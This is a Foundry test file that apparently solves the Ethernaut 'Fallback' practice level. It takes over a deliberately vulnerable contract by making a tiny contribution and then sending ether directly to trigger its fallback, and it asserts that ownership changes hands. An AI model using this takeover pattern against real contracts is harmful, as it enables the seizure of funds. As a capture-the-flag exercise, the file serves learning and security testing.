// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fb;
    address user = makeAddr("user");

    function setUp() public {
        fb = new Fallback();
        console.log("fallback owner  address is ", fb.owner());
        vm.deal(user, 1 ether);
    }

    function testFallBack() public {
        assertTrue(fb.owner() != user);
        vm.prank(user);
        fb.contribute{value: 0.00001 ether}();
        console.log("fallback owner address is now ", fb.owner());
        vm.prank(user);
        (bool result, ) = address(fb).call{value: 0.00000001 ether}("");
        console.log("call result is ", result);
        console.log("fallback owner address is now ", fb.owner());
        assertEq(fb.owner(), user);
        vm.prank(user);
        bytes memory val;
        (result, val) = address(fb).call(
            abi.encodeWithSignature("getContribution()")
        );
        console.log("call result is ", result);
        console.logBytes(val);
    }
}
